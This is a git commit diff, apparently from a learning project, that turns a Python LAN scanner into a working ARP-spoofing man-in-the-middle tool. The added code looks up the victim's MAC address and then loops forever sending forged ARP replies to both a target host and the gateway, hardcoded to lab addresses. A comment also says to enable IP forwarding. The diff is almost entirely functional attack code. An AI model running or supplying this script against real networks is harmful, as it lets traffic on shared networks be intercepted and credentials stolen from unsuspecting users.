c89ed9f6f3dd58a54e8a0a7641b711bd793d41f5
jonalOW <jonalgaming@gmail.com>
2021-02-22 08:03:55 -0500

    setup for mitm attack.

--- arp_spoof/main.py
+++ arp_spoof/main.py
@@ -2,36 +2,31 @@
 # use command: echo 1 > /proc/sys/net/ipv4/ip_forward
 import scapy.all as scapy
 import argparse
+import time
 
 
-def scan(ip_addr):  # ARP request on an IP range
+def get_mac(ip_addr):  # finds the MAC addr of the target computer
     arp_request = scapy.ARP(pdst=ip_addr)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
     answer_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return answer_list[0][1].hwsrc  # return the mac addr.
 
-    client_list = []
-    for answer in answer_list:
-        client_dict = {"ip": answer[1].psrc, "mac": answer[1].hwsrc}
-        client_list.append(client_dict)
-    return client_list
 
 def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="08:00:27:e6:e5:59", psrc=spoof_ip)
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     # op flag: 1 = arp request, 2 = arp response
     # hwdst is the MAC addr of the target
+    print("sending packet to: " + target_mac + " with ip " + target_ip)
+
     scapy.send(packet)
 
 
+def main(target_ip, spoof_ip): #executes man-in-the-middle
+    while True:
+        spoof(target_ip,spoof_ip)
+        spoof(spoof_ip,target_ip)
+        time.sleep(2)
 
-def get_args():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-t","--target",dest="target",help="the target's IP address")
-    parser.add_argument("-s","--spoof",dest="spoof",help="the IP you want to spoof as")
-    options = parser.parse_args()
-    if not options.target:
-        print("[-] Please enter a target IP address. Use --help for more information")
-    elif not options.spoof:
-        print("[-] Please enter the IP you wan to spoof as. Use --help for more information")
-    return options
-
+main("10.0.2.15","10.0.2.1")
